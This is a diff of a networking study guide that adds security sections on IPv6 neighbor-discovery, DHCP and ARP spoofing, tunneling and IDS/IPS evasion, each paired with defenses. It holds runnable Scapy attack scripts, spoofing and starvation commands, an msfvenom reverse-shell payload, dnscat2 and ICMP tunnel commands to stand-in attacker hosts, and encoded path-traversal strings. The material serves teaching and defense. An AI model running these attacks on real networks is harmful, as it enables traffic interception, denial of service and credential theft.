 **Purpose:** Divide a large network into smaller subnetworks
 
 **Benefits:**
@@ -5039,7 +6845,318 @@ or
 - Still years away for most organizations
 - Mobile carriers leading adoption
 
-### 14.14 IPv6 Address Examples
+### 14.14 IPv6 Security — Deep Dive for Security Professionals
+
+IPv6 introduces new attack surfaces and security considerations that many organizations overlook. Networks often have IPv6 enabled but unmonitored, creating significant security gaps.
+
+#### 14.14.1 Why IPv6 Security Matters
+
+**Common Security Gaps:**
+- IPv6 enabled by default on most modern OSes
+- Firewalls/IDS often only inspect IPv4
+- Network admins lack IPv6 training
+- "We don't use IPv6" mentality while IPv6 is active
+- Dual-stack means double the attack surface
+
+```bash
+# Check if IPv6 is enabled (it probably is)
+# Linux
+ip -6 addr show
+cat /proc/sys/net/ipv6/conf/all/disable_ipv6  # 0 = enabled
+
+# Windows
+netsh interface ipv6 show addresses
+
+# macOS
+ifconfig | grep inet6
+```
+
+#### 14.14.2 NDP (Neighbor Discovery Protocol) Attacks
+
+NDP is IPv6's replacement for ARP, but it's also vulnerable to spoofing attacks.
+
+**NDP Messages:**
+| Message | ICMPv6 Type | Purpose |
+|---------|-------------|---------|
+| Router Solicitation (RS) | 133 | "Any routers out there?" |
+| Router Advertisement (RA) | 134 | "I'm a router, here's the prefix" |
+| Neighbor Solicitation (NS) | 135 | "Who has this IPv6?" (like ARP) |
+| Neighbor Advertisement (NA) | 136 | "I have it" (like ARP reply) |
+| Redirect | 137 | "Use this better route" |
+
+**Router Advertisement Spoofing:**
+
+Attacker sends fake Router Advertisement to become the default gateway.
+
+```
+┌──────────────┐                    ┌──────────────┐
+│   Victim     │                    │ Real Router  │
+│ fe80::1234   │                    │ fe80::1      │
+└──────┬───────┘                    └──────┬───────┘
+       │                                   │
+       │        RS: "Any routers?"         │
+       │ ─────────────────────────────────>│
+       │                                   │
+       │ <───────── RA (legitimate) ───────│
+       │                                   │
+       │ <───────── RA (FAKE!) ────────────┤
+       │           from Attacker           │
+       │           "I'm the router!"       │
+       │           Priority: Higher        │
+       │                                   │
+       ▼                                   │
+┌──────────────┐                    ┌──────────────┐
+│   Attacker   │ ←── Traffic goes ──│   Victim     │
+│ fe80::evil   │     to attacker!   │              │
+└──────────────┘                    └──────────────┘
+```
+
+**Tools for NDP Attacks:**
+```bash
+# THC-IPv6 Toolkit (comprehensive)
+# Install: apt install thc-ipv6
+
+# Router Advertisement flood
+sudo fake_router6 eth0
+
+# Spoof as router with specific prefix
+sudo fake_router6 eth0 2001:db8::/64
+
+# Neighbor Advertisement spoofing (like ARP spoofing)
+sudo parasite6 eth0
+
+# Neighbor solicitation flood
+sudo flood_solicitate6 eth0
+
+# Using Scapy
+from scapy.all import *
+from scapy.layers.inet6 import *
+
+# Fake Router Advertisement
+ra = IPv6(dst="ff02::1")/\
+     ICMPv6ND_RA(routerlifetime=1800)/\
+     ICMPv6NDOptPrefixInfo(prefix="2001:db8:dead::", prefixlen=64)
+send(ra)
+```
+
+**Neighbor Cache Poisoning (IPv6 ARP Spoofing):**
+
+```bash
+# Using THC-IPv6
+sudo parasite6 -R eth0
+
+# Using Scapy - send fake Neighbor Advertisement
+from scapy.all import *
+
+target_ip = "fe80::1234"  # Victim's link-local
+gateway_ip = "fe80::1"    # Gateway to impersonate
+attacker_mac = "aa:bb:cc:dd:ee:ff"
+
+# Tell victim that gateway is at attacker's MAC
+na = IPv6(dst=target_ip)/\
+     ICMPv6ND_NA(tgt=gateway_ip, R=0, S=1, O=1)/\
+     ICMPv6NDOptDstLLAddr(lladdr=attacker_mac)
+send(na)
+```
+
+#### 14.14.3 SLAAC Attacks
+
+Stateless Address Autoconfiguration can be abused to control victim addressing.
+
+**Rogue RA Attack:**
+- Attacker advertises fake prefix
+- Victims autoconfigure addresses in attacker's "subnet"
+- Attacker becomes gateway for that prefix
+
+```bash
+# Using fake_router6 to push rogue prefix
+sudo fake_router6 eth0 2001:db8:evil::/64
+
+# Victims will:
+# 1. Add address in 2001:db8:evil::/64
+# 2. Add route for that prefix via attacker
+# 3. Potentially use attacker as default gateway
+```
+
+**Defense: RA Guard**
+```
+! Cisco RA Guard configuration
+ipv6 nd raguard policy BLOCK_RA
+  device-role host
+
+interface GigabitEthernet0/1
+  ipv6 nd raguard attach-policy BLOCK_RA
+```
+
+#### 14.14.4 IPv6 Reconnaissance
+
+IPv6 scanning differs from IPv4 due to massive address space.
+
+```bash
+# Can't scan /64 subnet - 2^64 addresses!
+# Techniques:
+
+# 1. Multicast discovery (find live hosts)
+ping6 -c 2 ff02::1%eth0  # All nodes multicast
+
+# 2. Using Nmap
+nmap -6 -sn fe80::1%eth0            # Single host
+nmap -6 --script ipv6-multicast-mld-list eth0  # MLD snooping
+
+# 3. Alive6 from THC-IPv6
+sudo alive6 eth0                    # Find live IPv6 hosts on LAN
+
+# 4. DNS enumeration (find AAAA records)
+dig AAAA target.com
+
+# 5. Look for predictable addresses
+# - ::1 (loopback-style)
+# - EUI-64 based (MAC embedded)
+# - Low addresses (::1, ::2, ::10)
+# - Sequential assignment patterns
+
+# 6. Extract from certificates, emails, logs
+```
+
+**IPv6 Address Patterns:**
+```
+Common patterns to scan:
+::1, ::2, ::10, ::100, ::1000
+::dead:beef (common test addresses)
+EUI-64 patterns from known MACs
+```
+
+#### 14.14.5 IPv6 Tunneling Attacks
+
+Tunneling mechanisms can bypass IPv4-only security controls.
+
+**6to4 Tunneling Abuse:**
+```
+6to4 automatically tunnels IPv6 over IPv4
+- Uses anycast 192.88.99.1
+- If 6to4 enabled, traffic may bypass firewalls
+- Attacker can intercept at anycast relay
+```
+
+**Teredo Tunneling:**
+```bash
+# Teredo tunnels IPv6 over UDP port 3544
+# Often allowed through firewalls
+
+# Check if Teredo is active (Windows)
+netsh interface teredo show state
+
+# Disable Teredo
+netsh interface teredo set state disabled
+
+# Teredo can be used for:
+# - Bypassing IPv4 firewalls
+# - Covert channels
+# - NAT traversal
+```
+
+**ISATAP Abuse:**
+```
+Intra-Site Automatic Tunnel Addressing Protocol
+- Auto-tunnels IPv6 over IPv4 within enterprise
+- Can create unauthorized connectivity
+```
+
+**Defense:**
+- Block protocol 41 (IPv6-in-IPv4 encapsulation) at perimeter
+- Block UDP 3544 (Teredo) if not needed
+- Disable 6to4 and Teredo on endpoints
+- Monitor for tunneled traffic
+
+#### 14.14.6 IPv6 Extension Header Attacks
+
+IPv6 extension headers can be abused for evasion.
+
+```
+IPv6 Extension Headers (ordered):
+1. Hop-by-Hop Options
+2. Destination Options
+3. Routing Header
+4. Fragment Header
+5. Authentication Header (AH)
+6. Encapsulating Security Payload (ESP)
+7. Destination Options (again)
+8. Mobility Header
+9. No Next Header
+```
+
+**Evasion Techniques:**
+```bash
+# Using extension headers to confuse IDS/firewalls:
+
+# 1. Fragmentation (like IPv4)
+# IPv6 only fragments at source, uses Fragment extension header
+
+# 2. Routing Header type 0 (deprecated but may work)
+# Specifies route through multiple hops
+# Can be used for amplification or source routing attacks
+
+# 3. Hop-by-Hop options
+# Processed by every router - can cause DoS
+
+# 4. Large extension header chains
+# May exceed IDS parsing limits
+```
+
+**Crafting Extension Headers with Scapy:**
+```python
+from scapy.all import *
+
+# Packet with multiple extension headers
+pkt = IPv6(dst="2001:db8::1")/\
+      IPv6ExtHdrHopByHop()/\
+      IPv6ExtHdrDestOpt()/\
+      IPv6ExtHdrFragment()/\
+      TCP(dport=80)
+
+send(pkt)
+```
+
+#### 14.14.7 IPv6 Security Best Practices
+
+| Defense | Description |
+|---------|-------------|
+| **Disable if not needed** | If not using IPv6, disable on all interfaces |
+| **Filter IPv6 at firewall** | Create IPv6 rules equivalent to IPv4 |
+| **RA Guard** | Block rogue Router Advertisements |
+| **DHCPv6 Guard** | Protect against rogue DHCPv6 |
+| **SEND (Secure NDP)** | Cryptographic NDP protection (rare) |
+| **Block tunneling** | Block 6to4, Teredo, ISATAP at perimeter |
+| **Monitor IPv6 traffic** | Include IPv6 in IDS/SIEM |
+| **IPv6 privacy extensions** | Rotate addresses to prevent tracking |
+| **Dual-stack firewall rules** | Mirror IPv4 rules for IPv6 |
+
+**Disable IPv6 (if truly not needed):**
+```bash
+# Linux - temporarily
+sudo sysctl -w net.ipv6.conf.all.disable_ipv6=1
+sudo sysctl -w net.ipv6.conf.default.disable_ipv6=1
+
+# Linux - permanently (/etc/sysctl.conf)
+net.ipv6.conf.all.disable_ipv6 = 1
+net.ipv6.conf.default.disable_ipv6 = 1
+
+# Windows
+Set-NetAdapterBinding -Name "Ethernet" -ComponentID ms_tcpip6 -Enabled $false
+```
+
+**IPv6 Security Tools:**
+| Tool | Purpose |
+|------|---------|
+| **THC-IPv6** | Comprehensive IPv6 attack toolkit |
+| **alive6** | IPv6 host discovery |
+| **fake_router6** | RA spoofing |
+| **parasite6** | Neighbor spoofing |
+| **Scapy** | Custom IPv6 packet crafting |
+| **Nmap** | IPv6 scanning and scripts |
+| **Wireshark** | IPv6 traffic analysis |
+
+### 14.15 IPv6 Address Examples
 
 **Documentation Prefix:**
 - **2001:db8::/32** - Reserved for documentation/examples
@@ -6261,6 +8378,276 @@ Internet <--> [External FW] <--> DMZ (web, email servers) <--> [Internal FW] <--
 > - Weak admin passwords
 > - Management interface on public Internet
 
+### 17.10 IDS/IPS Evasion Techniques
+
+Intrusion Detection Systems (IDS) and Intrusion Prevention Systems (IPS) monitor network traffic for malicious patterns. Understanding evasion techniques is essential for penetration testing and defense.
+
+#### 17.10.1 IDS vs IPS Overview
+
+| Feature | IDS | IPS |
+|---------|-----|-----|
+| **Mode** | Passive (monitors copy of traffic) | Inline (traffic flows through) |
+| **Action** | Alerts only | Blocks malicious traffic |
+| **Latency** | No impact | Small latency added |
+| **Failure Mode** | Graceful (traffic continues) | Fail-open or fail-close options |
+| **Risk** | Misses attacks | False positives block legitimate traffic |
+
+**Detection Methods:**
+- **Signature-Based:** Pattern matching against known attack signatures
+- **Anomaly-Based:** Detects deviations from baseline "normal" behavior
+- **Protocol Analysis:** Validates protocol compliance (e.g., proper HTTP headers)
+- **Heuristic/Behavioral:** Uses ML/rules to detect suspicious behavior
+
+#### 17.10.2 Fragmentation Evasion
+
+Split attack payload across multiple IP fragments so IDS doesn't see complete attack.
+
+```
+Normal attack:
+┌──────────────────────────────────────────────────────────────┐
+│ IP Header │ TCP Header │ "GET /etc/passwd"                   │
+└──────────────────────────────────────────────────────────────┘
+                ▲
+                │ IDS sees complete attack signature
+                │ → ALERT!
+
+Fragmented attack:
+┌─────────────────────────┐  ┌─────────────────────────┐  ┌────────────────┐
+│ IP Header (frag 0)      │  │ IP Header (frag 1)      │  │ IP Header      │
+│ TCP Header │ "GET /etc" │  │ "/pass"                 │  │ "wd"           │
+└─────────────────────────┘  └─────────────────────────┘  └────────────────┘
+        │                            │                            │
+        │ IDS sees fragments separately                           │
+        │ May not reassemble → Misses signature!                  │
+        └────────────────────────────────────────────────────────┘
+```
+
+```bash
+# Using fragroute
+# /etc/fragroute.conf:
+tcp_seg 8
+ip_frag 24
+order random
+delay 0.1
+
+# Run attack through fragroute
+fragroute -f /etc/fragroute.conf target.com
+
+# Using Nmap fragmentation
+nmap -f target.com               # Fragment packets (8 bytes)
+nmap --mtu 16 target.com         # Set custom MTU
+nmap -ff target.com              # 16-byte fragments
+
+# Using hping3
+hping3 -f -p 80 target.com       # Fragment packets
+```
+
+**Defense:** Enable fragment reassembly in IDS/IPS before inspection.
+
+#### 17.10.3 TTL-Based Evasion
+
+Craft packets so IDS sees them but target doesn't (or vice versa).
+
+```
+Network topology:
+[Attacker] ─── [IDS] ─── [Router] ─── [Target]
+              (3 hops from attacker)    (5 hops from attacker)
+
+Evasion:
+Packet 1: "Harmless" data, TTL=10 (reaches both IDS and target)
+Packet 2: "Attack" data, TTL=4 (IDS sees, but expires before target!)
+Packet 3: "More attack", TTL=10 (reaches target, IDS thinks it's benign sequence)
+
+Result: IDS sees: "Harmless" + "Attack" + "More attack" = No match
+        Target sees: "Harmless" + "More attack" = Attack payload reconstructed!
+```
+
+**Tools:**
+```bash
+# fragroute can manipulate TTL
+# /etc/fragroute.conf:
+ip_ttl 5
+```
+
+**Defense:** Normalize TTLs, drop packets with suspicious TTL values.
+
+#### 17.10.4 Overlapping Fragments
+
+Send overlapping IP fragments with different payloads.
+
+```
+Fragment 1: offset 0,  payload = "AAAA" (legitimate)
+Fragment 2: offset 0,  payload = "XXXX" (malicious, overlaps!)
+
+Windows reassembly: Uses FIRST fragment (AAAA)
+Linux reassembly: Uses LAST fragment (XXXX)
+
+If IDS reassembles like Windows but target is Linux:
+IDS sees: "AAAA" → benign
+Target sees: "XXXX" → attack executed!
+```
+
+```bash
+# Using Scapy for overlapping fragments
+from scapy.all import *
+
+# Fragment 1
+frag1 = IP(dst="target", flags="MF", frag=0)/TCP(dport=80)/("A"*8)
+
+# Fragment 2 (overlaps at offset 0)
+frag2 = IP(dst="target", frag=0)/TCP(dport=80)/("X"*8)  # Different payload!
+
+send([frag1, frag2])
+```
+
+**Defense:** Use consistent fragment reassembly, reject overlapping fragments.
+
+#### 17.10.5 Protocol-Level Evasion
+
+**HTTP Evasion:**
+```bash
+# URL encoding
+GET /etc/passwd           # Detected
+GET /%65%74%63/passwd     # URL-encoded "etc" - may bypass
+GET /etc%2fpasswd         # Encoded slash
+
+# Unicode encoding (IIS)
+GET /..%c0%af../winnt/    # Unicode traversal
+
+# Null bytes
+GET /etc/passwd%00.jpg    # Null byte terminates string in some parsers
+
+# HTTP request splitting (HTTP/1.0)
+GET / HTTP/1.0\r\n
+Header: value\r\n
+\r\n
+GET /malicious HTTP/1.0   # Second request hidden
+
+# Mixed case
+GET /ETC/PASSWD           # Case-insensitive file systems
+```
+
+**TCP Evasion:**
+```bash
+# Urgent data pointer manipulation
+# Data in urgent field may be handled differently
+
+# Session splicing
+# Split single request across many TCP segments
+# Each segment small enough to avoid signatures
+```
+
+#### 17.10.6 Timing Evasion
+
+Slow attacks below IDS detection threshold.
+
+```bash
+# Nmap timing options
+nmap -T0 target.com    # Paranoid - extremely slow (5 min between probes)
+nmap -T1 target.com    # Sneaky - 15 seconds between probes
+nmap -T2 target.com    # Polite - 0.4 seconds between probes
+
+# Custom timing
+nmap --scan-delay 30s target.com    # 30 second delay
+nmap --max-rate 1 target.com        # 1 packet per second
+
+# Spread scan over days
+for port in 22 80 443 3389; do
+    nmap -p $port target.com
+    sleep 3600  # Wait 1 hour between ports
+done
+```
+
+**Defense:** Long-term correlation, session tracking across time.
+
+#### 17.10.7 Encryption and Tunneling
+
+Hide attack in encrypted channel.
+
+```bash
+# DNS tunneling (dnscat2)
+# Server:
+ruby dnscat2.rb attacker.com
+
+# Client (on compromised host):
+./dnscat2 attacker.com
+
+# All C2 traffic hidden in DNS queries!
+
+# HTTPS inspection bypass
+# If IPS can't decrypt TLS, attack in encrypted payload is invisible
+
+# ICMP tunneling
+ptunnel -p proxy.attacker.com -lp 8000 -da target.internal -dp 22
+```
+
+**Defense:** SSL/TLS inspection (with privacy considerations), DNS inspection, ICMP monitoring.
+
+#### 17.10.8 Polymorphic and Metamorphic Code
+
+Change attack code appearance while maintaining functionality.
+
+```bash
+# Shellcode encoding with msfvenom
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
+    -e x86/shikata_ga_nai -i 10 -f raw
+
+# -e = encoder (shikata_ga_nai is polymorphic)
+# -i = iterations (encode 10 times)
+# Result: Different-looking payload each time
+```
+
+```
+Original shellcode signature: \x31\xc0\x50\x68\x2f\x2f\x73\x68...
+Encoded (iteration 1):        \xd9\xe8\xd9\x74\x24\xf4\x5b\x29...
+Encoded (iteration 2):        \xbe\x23\xc8\x12\xda\xda\xd9\x74...
+```
+
+**Defense:** Behavioral analysis, sandbox execution, heuristic detection.
+
+#### 17.10.9 IDS/IPS Evasion Tools Summary
+
+| Tool | Purpose |
+|------|---------|
+| **fragroute** | Packet fragmentation and manipulation |
+| **fragrouter** | Fragmenting router for testing |
+| **Nmap** | Timing, fragmentation, decoy scans |
+| **hping3** | Custom packet crafting |
+| **msfvenom** | Payload encoding |
+| **Scapy** | Low-level packet manipulation |
+| **dnscat2** | DNS tunneling |
+| **ptunnel** | ICMP tunneling |
+| **Snort/Suricata** | Test your own rules! |
+
+**Testing Your Own IDS:**
+```bash
+# Generate traffic that should trigger alerts
+# Verify IDS detects and alerts correctly
+
+# Test fragmentation handling
+nmap -f -sS -p 80 <your_test_server>
+
+# Test signature detection
+curl "http://test-server/etc/passwd"  # Should trigger
+
+# Review Snort/Suricata alerts
+tail -f /var/log/snort/alert
+```
+
+#### 17.10.10 Defense: Hardening IDS/IPS
+
+| Hardening Measure | Description |
+|-------------------|-------------|
+| **Full Reassembly** | Reassemble fragments before inspection |
+| **Protocol Normalization** | Decode URL encoding, normalize HTTP |
+| **TTL Sanity Checks** | Drop anomalous TTL packets |
+| **Session Tracking** | Correlate across long time periods |
+| **TLS Inspection** | Decrypt and inspect (where appropriate) |
+| **Multiple Sensors** | Deploy at multiple network points |
+| **Signature + Anomaly** | Use both detection methods |
+| **Regular Updates** | Keep signatures current |
+| **Tune False Positives** | Reduce noise to catch real attacks |
+
 [↑ Back to top](#table-of-contents)
 
 ---
@@ -6544,6 +8931,8 @@ Example /24:
 
 ### 18.5 Subnetting
 
+> 📖 *Also see [Section 13.6 Subnetting](#136-subnetting) for additional subnetting concepts, binary calculations, and practical examples.*
+
 **Purpose:** Divide large network into smaller, manageable subnetworks
 
 **Benefits:**
@@ -6705,6 +9094,218 @@ Into:
 - Centralized management (DHCP)
 - Consistent addressing (static-like behavior)
 
+#### 18.7.4 DHCP Attacks — Security Deep Dive
+
+DHCP operates without authentication, making it vulnerable to several attack types. Understanding these is critical for network security.
+
+##### **DHCP Starvation Attack**
+
+**What It Is:**
+Attacker floods DHCP server with DISCOVER requests using spoofed MAC addresses, exhausting the IP address pool so legitimate clients can't get addresses.
+
+**Attack Diagram:**
+```
+┌────────────┐     DISCOVER (MAC: AA)     ┌─────────────┐
+│            │ ─────────────────────────> │             │
+│            │     DISCOVER (MAC: BB)     │             │
+│  Attacker  │ ─────────────────────────> │ DHCP Server │
+│            │     DISCOVER (MAC: CC)     │             │
+│            │ ─────────────────────────> │  Pool: 254  │
+│            │     ... (thousands)        │  IPs        │
+└────────────┘                            └─────────────┘
+                                                 │
+                                                 ▼
+                                          Pool Exhausted!
+                                                 │
+┌────────────┐     DISCOVER               ┌─────────────┐
+│ Legitimate │ ─────────────────────────> │ DHCP Server │
+│   Client   │     ❌ No IP Available     │  Pool: 0    │
+└────────────┘                            └─────────────┘
+```
+
+**Tools:**
+```bash
+# Yersinia (most popular)
+sudo yersinia -G  # GUI mode
+# Select DHCP tab > "sending DISCOVER packet" > Launch attack
+
+# DHCPig (Python)
+pip install scapy
+python dhcpig.py eth0
+
+# Gobbler (dhcpstarv)
+dhcpstarv -i eth0
+
+# Scapy (custom)
+from scapy.all import *
+for i in range(1000):
+    mac = RandMAC()
+    dhcp_discover = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")/\
+                    IP(src="0.0.0.0", dst="255.255.255.255")/\
+                    UDP(sport=68, dport=67)/\
+                    BOOTP(chaddr=mac)/\
+                    DHCP(options=[("message-type","discover"),"end"])
+    sendp(dhcp_discover, iface="eth0")
+```
+
+##### **Rogue DHCP Server Attack**
+
+**What It Is:**
+Attacker sets up a fake DHCP server that responds faster than the legitimate one, providing malicious network configuration to victims.
+
+**Attack Impact:**
+- **Malicious Gateway:** Route all traffic through attacker (MITM)
+- **Malicious DNS:** Redirect DNS queries to attacker-controlled server (pharming)
+- **Wrong Subnet:** Isolate victim from network
+
+**Attack Diagram:**
+```
+                         DISCOVER (broadcast)
+┌──────────┐ ──────────────────────────────────────────────┐
+│  Victim  │                                               │
+└──────────┘                                               │
+      │                                                    │
+      │              ┌─────────────────┐    ┌──────────────▼───┐
+      │              │ Legitimate DHCP │    │   Rogue DHCP     │
+      │              │ Server (slow)   │    │   (attacker)     │
+      │              │ GW: 192.168.1.1 │    │ GW: 192.168.1.99 │
+      │              │ DNS: 8.8.8.8    │    │ DNS: 192.168.1.99│
+      │              └─────────────────┘    └──────────────────┘
+      │                     │ OFFER (slow)         │ OFFER (fast!)
+      │                     │                      │
+      ▼                     ▼                      ▼
+┌──────────┐   Victim accepts first OFFER → Attacker's config!
+│  Victim  │   Gateway: 192.168.1.99 (Attacker)
+│ Poisoned │   DNS: 192.168.1.99 (Attacker)
+└──────────┘
+```
+
+**Setting Up Rogue DHCP (for testing):**
+```bash
+# Using Metasploit
+msfconsole
+use auxiliary/server/dhcp
+set DHCPIPSTART 192.168.1.100
+set DHCPIPEND 192.168.1.200
+set NETMASK 255.255.255.0
+set ROUTER 192.168.1.99      # Attacker's IP
+set DNSSERVER 192.168.1.99   # Attacker's IP
+set SRVHOST 192.168.1.99
+run
+
+# Using Ettercap
+sudo ettercap -T -q -i eth0 -P dhcp_spoof
+
+# Using dnsmasq (manual)
+# /etc/dnsmasq.conf
+interface=eth0
+dhcp-range=192.168.1.100,192.168.1.200,12h
+dhcp-option=3,192.168.1.99   # Gateway
+dhcp-option=6,192.168.1.99   # DNS
+```
+
+##### **DHCP ACK Injection**
+
+**What It Is:**
+Attacker sniffs DHCP DISCOVER/REQUEST and races to send malicious ACK before legitimate server responds.
+
+```bash
+# Using Scapy to inject ACK
+from scapy.all import *
+
+def dhcp_ack_inject(pkt):
+    if DHCP in pkt and pkt[DHCP].options[0][1] == 3:  # DHCP Request
+        victim_mac = pkt[Ether].src
+        victim_ip = pkt[BOOTP].yiaddr
+        
+        malicious_ack = Ether(src=get_if_hwaddr("eth0"), dst=victim_mac)/\
+                        IP(src="192.168.1.99", dst=victim_ip)/\
+                        UDP(sport=67, dport=68)/\
+                        BOOTP(op=2, yiaddr=victim_ip, siaddr="192.168.1.99", chaddr=victim_mac)/\
+                        DHCP(options=[("message-type","ack"),
+                                     ("server_id","192.168.1.99"),
+                                     ("lease_time",3600),
+                                     ("router","192.168.1.99"),
+                                     ("name_server","192.168.1.99"),
+                                     "end"])
+        sendp(malicious_ack, iface="eth0")
+
+sniff(filter="udp and (port 67 or port 68)", prn=dhcp_ack_inject)
+```
+
+##### **DHCP Attack Defenses**
+
+**1. DHCP Snooping (Primary Defense)**
+
+Switch-level feature that creates binding database of legitimate DHCP assignments.
+
+```
+! Cisco IOS Configuration
+! Enable DHCP snooping globally
+ip dhcp snooping
+ip dhcp snooping vlan 10,20,30
+
+! Trust the legitimate DHCP server port
+interface GigabitEthernet0/1
+  ip dhcp snooping trust
+
+! Untrusted ports (all client ports) - rate limit
+interface range GigabitEthernet0/2-48
+  ip dhcp snooping limit rate 10
+
+! Verify
+show ip dhcp snooping
+show ip dhcp snooping binding
+```
+
+**How DHCP Snooping Works:**
+- Trusted ports: Can send DHCP server messages (OFFER, ACK)
+- Untrusted ports: Can only send DHCP client messages (DISCOVER, REQUEST)
+- Drops DHCP server messages from untrusted ports
+- Builds binding table: MAC, IP, VLAN, Port, Lease Time
+- This table is used by DAI and IP Source Guard
+
+**2. DHCP Server Redundancy**
+- Deploy multiple DHCP servers
+- Split scope between servers (70/30 or 50/50)
+- Use DHCP failover (Windows Server, ISC DHCP)
+
+**3. Port Security**
+Limit MAC addresses per port to prevent starvation:
+```
+! Cisco
+interface GigabitEthernet0/5
+  switchport port-security
+  switchport port-security maximum 2
+  switchport port-security violation restrict
+```
+
+**4. Rate Limiting**
+Limit DHCP packets per port:
+```
+! Already shown in DHCP snooping config
+ip dhcp snooping limit rate 10  # 10 packets/second
+```
+
+**5. 802.1X Authentication**
+Require authentication before DHCP access.
+
+**6. Static IP for Critical Systems**
+Servers, routers, and security devices should use static IPs.
+
+**7. Monitoring and Alerting**
+```bash
+# Monitor for multiple DHCP servers
+tcpdump -i eth0 -n 'udp port 67' | grep -E "OFFER|ACK"
+
+# Alert on unexpected DHCP servers
+# Snort/Suricata rule:
+alert udp any 67 -> any 68 (msg:"DHCP Server Response"; \
+  content:"|02|"; offset:0; depth:1; \
+  detection_filter:track by_src, count 1, seconds 60; \
+  sid:1000001; rev:1;)
+```
+
 ### 18.8 Address Resolution
 
 #### 18.8.1 ARP (Address Resolution Protocol) - IPv4
@@ -6734,7 +9335,212 @@ arp -s <IP> <MAC>       # Static entry
 - Redirects traffic to attacker (man-in-the-middle)
 - Mitigation: Static ARP entries, ARP inspection, segmentation
 
-#### 18.8.2 NDP (Neighbor Discovery Protocol) - IPv6
+#### 18.8.2 ARP Attacks — Deep Dive for Security Professionals
+
+ARP has no authentication mechanism, making it one of the most exploited Layer 2 vulnerabilities. Understanding ARP attacks is fundamental for both offensive and defensive security.
+
+##### **ARP Spoofing / ARP Poisoning**
+
+**What It Is:**
+An attacker sends forged ARP replies (gratuitous ARP) to associate their MAC address with the IP address of a legitimate host (usually the gateway or target machine).
+
+**Attack Diagram:**
+```
+Normal Network:
+┌─────────────┐      ┌─────────────┐      ┌─────────────┐
+│   Victim    │ ───> │   Router    │ ───> │  Internet   │
+│ 192.168.1.5 │      │ 192.168.1.1 │      │             │
+│ MAC: AA:AA  │      │ MAC: BB:BB  │      └─────────────┘
+└─────────────┘      └─────────────┘
+
+After ARP Spoofing:
+┌─────────────┐      ┌─────────────┐      ┌─────────────┐
+│   Victim    │ ───> │  Attacker   │ ───> │   Router    │
+│ 192.168.1.5 │      │ 192.168.1.9 │      │ 192.168.1.1 │
+│ MAC: AA:AA  │      │ MAC: CC:CC  │      │ MAC: BB:BB  │
+└─────────────┘      └─────────────┘      └─────────────┘
+          │                 │
+          │    Victim's ARP cache:          │
+          │    192.168.1.1 → CC:CC (ATTACKER!)
+          │    Traffic to gateway goes to attacker
+```
+
+**Step-by-Step Attack:**
+1. Attacker identifies victim (192.168.1.5) and gateway (192.168.1.1)
+2. Attacker sends ARP reply to victim: "192.168.1.1 is at CC:CC:CC:CC:CC:CC" (attacker's MAC)
+3. Attacker sends ARP reply to gateway: "192.168.1.5 is at CC:CC:CC:CC:CC:CC" (attacker's MAC)
+4. Victim updates ARP cache with poisoned entry
+5. Gateway updates ARP cache with poisoned entry
+6. Traffic between victim and gateway now flows through attacker
+7. Attacker forwards traffic (to avoid detection) while sniffing/modifying
+
+**Tools for ARP Spoofing:**
+```bash
+# arpspoof (dsniff package)
+sudo arpspoof -i eth0 -t 192.168.1.5 -r 192.168.1.1
+
+# ettercap (GUI and CLI)
+sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.5// /192.168.1.1//
+
+# Bettercap (modern, recommended)
+sudo bettercap -iface eth0
+> net.probe on
+> set arp.spoof.targets 192.168.1.5
+> arp.spoof on
+
+# Scapy (Python - custom attacks)
+from scapy.all import *
+def arp_spoof(target_ip, spoof_ip):
+    target_mac = getmacbyip(target_ip)
+    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    send(packet, verbose=False)
+```
+
+##### **Man-in-the-Middle (MITM) via ARP**
+
+**Complete MITM Setup:**
+```bash
+# 1. Enable IP forwarding (Linux)
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# 2. Start ARP spoofing (both directions)
+sudo arpspoof -i eth0 -t 192.168.1.5 192.168.1.1 &
+sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.5 &
+
+# 3. Capture traffic
+sudo tcpdump -i eth0 -w captured.pcap host 192.168.1.5
+
+# 4. Or intercept with mitmproxy (for HTTPS inspection)
+mitmproxy --mode transparent --showhost
+```
+
+**What Attackers Can Do with MITM:**
+- **Credential Harvesting:** Capture HTTP passwords, form data, cookies
+- **Session Hijacking:** Steal session tokens to impersonate users
+- **SSL Stripping:** Downgrade HTTPS to HTTP (sslstrip)
+- **DNS Spoofing:** Redirect DNS queries to malicious servers
+- **Packet Injection:** Insert malicious content into HTTP responses
+- **Traffic Analysis:** See what victim is browsing/downloading
+
+##### **Gratuitous ARP Attacks**
+
+**What is Gratuitous ARP?**
+An unsolicited ARP reply sent to update neighbor caches. Legitimate uses include:
+- Announcing IP after boot
+- Detecting IP conflicts
+- Updating caches after failover (VRRP/HSRP)
+
+**Malicious Use:**
+Attackers send gratuitous ARP to overwrite legitimate entries without prompting.
+
+```bash
+# Send gratuitous ARP with arping
+sudo arping -U -I eth0 192.168.1.1  # Claim to be 192.168.1.1
+```
+
+##### **ARP Cache Poisoning Detection**
+
+**Manual Detection:**
+```bash
+# Check ARP cache for duplicates
+arp -a | sort | uniq -d
+
+# Look for MAC address changes
+watch -n 1 'arp -a'
+
+# Check gateway MAC against known good
+arp -a | grep "192.168.1.1"
+```
+
+**Detection Tools:**
+```bash
+# arpwatch - Monitor ARP activity
+sudo apt install arpwatch
+sudo arpwatch -i eth0
+
+# arpwatch logs to syslog when:
+# - New station (new MAC seen)
+# - Flip flop (MAC changed for IP)
+# - Changed ethernet address
+
+# XArp (Windows GUI tool)
+# Detects ARP spoofing in real-time
+
+# Wireshark filter for ARP anomalies
+arp.duplicate-address-detected
+arp.opcode == 2  # Filter replies only
+```
+
+**Wireshark ARP Analysis:**
+```
+# Filter: Excessive ARP replies from single source
+arp.opcode == 2 && eth.src == aa:bb:cc:dd:ee:ff
+
+# Filter: ARP replies for gateway IP
+arp.opcode == 2 && arp.src.proto_ipv4 == 192.168.1.1
+
+# Expert Info will show:
+# "Duplicate IP address detected"
+# "ARP packet storm"
+```
+
+##### **ARP Attack Defenses**
+
+**1. Dynamic ARP Inspection (DAI)**
+Switch-level defense that validates ARP packets against DHCP snooping database.
+
+```
+! Cisco IOS Configuration
+ip dhcp snooping
+ip dhcp snooping vlan 10
+
+interface GigabitEthernet0/1
+  ip arp inspection trust      ! Trusted uplink
+  
+interface range GigabitEthernet0/2-24
+  ip arp inspection limit rate 15  ! Rate limit ARP
+```
